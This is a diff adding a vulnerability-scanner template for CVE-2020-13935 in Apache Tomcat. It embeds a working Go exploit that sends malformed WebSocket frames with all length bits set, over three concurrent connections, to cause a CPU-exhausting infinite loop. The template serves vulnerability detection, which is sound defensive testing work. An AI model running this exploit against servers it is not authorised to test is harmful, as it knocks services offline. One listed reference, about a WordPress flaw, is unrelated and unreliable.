@@ -1,0 +1,278 @@
+id: CVE-2020-13935
+
+info:
+  name: Apache Tomcat WebSocket Frame Payload Length Validation Denial of Service
+  author: sttlr
+  severity: high
+  description: |
+    Apache Tomcat versions 10.0.0-M1 to 10.0.0-M6, 9.0.0.M1 to 9.0.36, 8.5.0 to 8.5.56, and 7.0.27 to 7.0.104 contain a vulnerability in the WebSocket module where the payload length of WebSocket frames is not correctly validated. This can lead to an infinite loop when processing frames with invalid payload lengths. Attackers can exploit this flaw by sending multiple malicious requests, resulting in a denial of service (DoS) on the affected Tomcat instance.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    cvss-score: 7.5
+    cve-id: CVE-2020-13935
+  reference:
+    - http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00084.html
+    - http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00088.html
+    - http://packetstormsecurity.com/files/161213/WordPress-5.0.0-Remote-Code-Execution.html
+    - https://kc.mcafee.com/corporate/index?page=content&id=SB10332
+    - https://lists.apache.org/thread.html/r4e5d3c09f4dd2923191e972408b40fb8b42dbff0bc7904d44b651e50%40%3Cusers.tomcat.apache.org%3E
+    - https://security.netapp.com/advisory/ntap-20200724-0003/
+    - https://github.com/RedTeamPentesting/CVE-2020-13935
+  metadata:
+    shodan-query: html:"Apache Tomcat"
+    vendor: apache
+    product: tomcat
+  tags: cve,cve2020,tomcat,websocket,dos,code
+
+flow: http(1) && code(1,2) && code (3)
+
+variables:
+  random_message: "{{randstr}}"
+
+http:
+  - method: GET
+    path:
+      - "{{RootURL}}/examples/websocket/echo.xhtml"
+
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - "status_code == 200"
+          - 'contains(body, "<title>Apache Tomcat WebSocket Examples: Echo</title>")'
+
+code:
+  - engine:
+      - bash
+      - sh
+      - powershell
+      - powershell.exe
+      - cmd
+      - cmd.exe
+    source: |
+      go get github.com/gorilla/websocket@v1.4.2
+
+  - engine:
+      - go
+    args:
+      - run
+    pattern: "*.go"
+    source: |
+      package main
+
+      import (
+        "fmt"
+        "net/url"
+        "time"
+        "os"
+
+        "github.com/gorilla/websocket"
+      )
+
+      func main() {
+        var inputURL string
+        fmt.Scanln(&inputURL)
+
+        parsedURL, err := url.Parse(inputURL)
+        if err != nil {
+          fmt.Fprintln(os.Stderr, "Invalid URL:", err)
+          return
+        }
+
+        u := url.URL{Scheme: "ws", Host: parsedURL.Host, Path: "/examples/websocket/echoProgrammatic"}
+
+        conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
+        if err != nil {
+          fmt.Fprintln(os.Stderr, "Failed to connect:", err)
+          return
+        }
+        defer conn.Close()
+
+        message, exists := os.LookupEnv("random_message")
+        if !exists {
+          return
+        }
+
+        err = conn.WriteMessage(websocket.TextMessage, []byte(message))
+        if err != nil {
+          fmt.Fprintln(os.Stderr, "Failed to send message:", err)
+          return
+        }
+        fmt.Fprintln(os.Stdout, "Sent message:", string(message))
+
+        _, response, err := conn.ReadMessage()
+        if err != nil {
+          fmt.Fprintln(os.Stderr, "Failed to read message:", err)
+          return
+        }
+        fmt.Fprintln(os.Stdout, "Received message:", string(response))
+      }
+
+    matchers:
+      - type: word
+        part: response
+        internal: true
+        condition: and
+        words:
+          - "Sent message: {{randstr}}"
+          - "Received message: {{randstr}}"
+
+  - engine:
+      - go
+    args:
+      - run
+    pattern: "*.go"
+    source: |
+      /****************************************
+      *                                      *
+      *  RedTeam Pentesting GmbH             *
+      *  kontakt@redteam-pentesting.de       *
+      *  https://www.redteam-pentesting.de/  *
+      *                                      *
+      ****************************************/
+
+      package main
+
+      import (
+        "bytes"
+        "fmt"
+        "os"
+        "sync"
+        "time"
+        "net/url"
+
+        "github.com/gorilla/websocket"
+      )
+
+      // CVE-2020-13935
+      //
+      // this program exploits a bug in tomcat which leads to continuous,
+      // high cpu usage if all bits of the length field of a websocket message
+      // are set to 1.
+      //
+      // Affected Versions:
+      // 10.0.0-M1 to 10.0.0-M6
+      // 9.0.0.M1 to 9.0.36
+      // 8.5.0 to 8.5.56
+      // 8.0.1 to 8.0.53
+      // 7.0.27 to 7.0.104
+      //
+      // see:
+      // https://bz.apache.org/bugzilla/show_bug.cgi?id=64563
+      // https://access.redhat.com/security/cve/CVE-2020-13935
+
+      func main() {
+        if err := run(); err != nil {
+          fmt.Fprintln(os.Stderr, err)
+        }
+      }
+
+      func sendInvalidWebSocketMessage(url string) error {
+        ws, _, err := websocket.DefaultDialer.Dial(url, nil)
+
+        if err != nil {
+          return fmt.Errorf("dial: %s", err)
+        }
+
+        // +-+-+-+-+-------+-+-------------+-------------------------------+
+        //  0                   1                   2                   3
+        //  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+        // +-+-+-+-+-------+-+-------------+-------------------------------+
+        // |F|R|R|R| opcode|M| Payload len |    Extended payload length    |
+        // |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
+        // |N|V|V|V|       |S|             |   (if payload len==126/127)   |
+        // | |1|2|3|       |K|             |                               |
+        // +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
+        // |     Extended payload length continued, if payload len == 127  |
+        // + - - - - - - - - - - - - - - - +-------------------------------+
+        // |                               | Masking-key, if MASK set to 1 |
+        // +-------------------------------+-------------------------------+
+        // | Masking-key (continued)       |          Payload Data         |
+        // +-------------------------------- - - - - - - - - - - - - - - - +
+        // :                     Payload Data continued ...                :
+        // + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
+        // |                     Payload Data continued ...                |
+        // +---------------------------------------------------------------+
+
+        var buf bytes.Buffer
+
+        fin := 1
+        rsv1 := 0
+        rsv2 := 0
+        rsv3 := 0
+        opcode := websocket.TextMessage
+
+        buf.WriteByte(byte(fin<<7 | rsv1<<6 | rsv2<<5 | rsv3<<4 | opcode))
+
+        // always set the mask bit
+        // indicate 64 bit message length
+        buf.WriteByte(byte(1<<7 | 0b1111111))
+
+        // set msb to 1, violating the spec and triggering the bug
+        buf.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
+
+        // 4 byte masking key
+        // leave zeros for now, so we do not need to mask
+        maskingKey := []byte{0, 0, 0, 0}
+        buf.Write(maskingKey)
+
+        // write an incomplete message
+        message, exists := os.LookupEnv("random_message")
+        if !exists {
+          return nil
+        }
+
+        buf.WriteString(message)
+
+        _, err = ws.UnderlyingConn().Write(buf.Bytes())
+        if err != nil {
+          return fmt.Errorf("write: %s", err)
+        }
+
+        ws.SetReadDeadline(time.Now().Add(7 * time.Second))
+        _, response, err := ws.ReadMessage()
+        if err != nil {
+          return fmt.Errorf("read: %s", err)
+        }
+
+        fmt.Fprintln(os.Stdout, "Received message:", string(response))
+
+        return nil
+      }
+
+      func run() error {
+        var inputURL string
+        fmt.Scanln(&inputURL)
+
+        parsedURL, err := url.Parse(inputURL)
+        if err != nil {
+          fmt.Fprintln(os.Stderr, err)
+          return nil
+        }
+
+        u := url.URL{Scheme: "ws", Host: parsedURL.Host, Path: "/examples/websocket/echoProgrammatic"}
+        targetURL := u.String()
+
+        var wg sync.WaitGroup
+
+        for i := 0; i < 3; i++ {
+          wg.Add(1)
+          go func() {
+            defer wg.Done()
+
+            if err := sendInvalidWebSocketMessage(targetURL); err != nil {
+              fmt.Fprintln(os.Stderr, err)
+            }
+          }()
+        }
+
+        wg.Wait()
+
+        return nil
+      }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(stderr, 'read tcp', 'i/o timeout') && !contains(stderr, 'websocket: close 1002 (protocol error): An invalid WebSocket frame was received - the most significant bit of a 64-bit payload was illegally set')"
+# digest: 490a0046304402201cc078bbe522c2e7e65046d1f57942c4416e145f327b671423c69f8cee335a03022076c19957a2a9ac877638982a59b80c38c454d390ab213de628db7bffb7a402e9:62279eae9ebf191e34eae847adfdbab2
